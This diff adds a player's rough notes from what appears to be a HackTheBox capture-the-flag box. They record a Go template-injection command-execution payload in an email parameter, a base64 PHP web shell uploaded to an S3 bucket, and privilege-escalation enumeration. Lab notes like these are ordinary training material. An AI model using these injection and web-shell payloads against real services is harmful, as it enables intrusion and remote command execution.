@@ -1,0 +1,73 @@
+[USERNAMES]
+big0us(?) - from port 80
+
+[???]
+ssti in port 8080 forgot page:
+payload: {{.Email}}
+
+rce found in email param on port 8080:
+email={{.DebugCmd "sh -c 'ls -al'"}}
+
+From root's bash_history:
+aws s3 ls s3://
+aws s3 ls s3://website
+aws s3 rm s3://website/ippsec.php
+aws s3 ls s3://website
+exit
+
+From root's /etc/hosts:
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.28.0.3	aws
+
+contents of /proc/net/tcp:
+  0: 0B00007F:B36D 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 38454 1 0000000000000000 100 0 0 10 0
+
+This shit works for the aws things:
+email={{.DebugCmd "sh -c 'aws s3 ls --endpoint-url http://172.28.0.1:9000/website/'"}}
+
+Payload used for reverse shell:
+email={{.DebugCmd "sh -c 'echo -n \'PD9waHAgaWYoSVNTRVQoJF9SRVFVRVNUWydjbWQnXSkpIHsgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pO30/Pg==\' > /tmp/shell.php'"}}
+email={{.DebugCmd "sh -c 'aws s3 --endpoint-url http://172.28.0.1:9000 cp /tmp/shell.php s3://website'"}}
+
+Privesc notes:
+sudo ver. 1.8.31
+/bin/bash /usr/local/bin/docker-entrypoint.sh
+/bin/sh -c chmod +x /opt/uhc/main; cd /opt/uhc; ./main
+/etc/ImageMagick-6/mime.xml
+/home/ubuntu/.viminfo
+/usr/bin/incrontab
+/etc/docker/key.json <-- unreadable yet
+/usr/bin/containerd-shim-runc-v2
+ail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
+writable /run/uuidd/request
+writable /run/dbus/system_bus_socket
+/var/log/nginx/access.log
+/var/log/auth.log
+Ubuntu 9.3.0-17ubuntu1~20.04
+/etc/init/docker.conf
+
+Network setup:
+80 -> we poped shell from here
+4566 -> ??
+8080 -> go stti
+9000 -> aws
+9001 -> go stti
+
+Port 4566:
+authorization SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+
+load_module modules/ngx_http_execute_module.so;
+
+
+Can enter /opt/container.d but can't list dir:
+if we know a file that exists within the container we can read it
+
+[SOFTWARES]
+port 8080 running golang:
+.go extentions?
+
